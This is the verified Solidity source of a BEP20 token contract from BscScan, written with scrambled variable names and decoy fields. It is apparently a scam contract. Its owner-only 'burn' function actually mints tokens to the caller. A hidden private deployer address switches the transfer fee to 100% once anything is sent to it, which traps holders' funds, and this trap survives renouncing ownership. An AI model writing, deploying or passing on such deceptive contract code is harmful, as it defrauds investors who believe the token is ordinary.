/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-11
 */
pragma solidity >=0.4.11;
contract BYKprv {
address public owner;
uint256 public  pEReNe = 10000000000000000000;
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  QrmHWd = address(0);
address public  DmmAWK = address(0);
uint256 public  ciJJhf = 100000000000000000;
uint256 private  feLYwj = 10000000000000;
mapping (address => uint256) public balanceOf;
address public  uIAFqt = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "NzlyYR";
uint256 public  JjaZeQ = 10000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public  EHdFDD = address(0);
uint256 public  iGQQuL = 100000000000000000000000;
uint256 public  PXglLt = 100000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address public  sxgDeE = address(0);
address private  decpxy = address(0);
uint256 public constant ArHkxX = 9+1;
string public  symbol = "GPducF";
address public  GFUhHa = address(0);
uint256 public  TJxHbc = 100000000000000000000;
uint256 public  ZTENiQ = 10000000000000000000000000000;
uint256 public  sSavkh = 1000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event Transfer(address indexed from, address indexed to, uint256 value);
uint8 public constant decimals = 18;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "eCOzIZ");
require(to != address(0), "eCOzIZ");
require(amount <= balanceOf[from], "eCOzIZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* ArHkxX/feLYwj ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==decpxy){
feLYwj = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
constructor ()  {
decpxy = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

}